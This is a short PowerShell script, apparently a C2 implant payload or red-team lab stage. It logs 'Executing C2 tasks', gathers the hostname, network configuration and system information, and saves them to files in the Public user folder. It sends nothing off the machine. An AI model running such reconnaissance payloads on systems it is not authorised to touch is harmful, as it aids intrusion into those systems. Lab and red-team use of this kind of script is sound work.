# payload.ps1
# Write a message to the local system as a log
Write-Output "Executing C2 tasks on $(hostname)" | Out-File -FilePath "C:\Users\Public\c2_log.txt" -Append

# Task 1: Gather system information
$hostname = (hostname)
$ipconfig = (ipconfig /all | Out-String)
$systeminfo = (systeminfo | Out-String)

# Combine information into one variable and save it to a file
$info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
$info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"
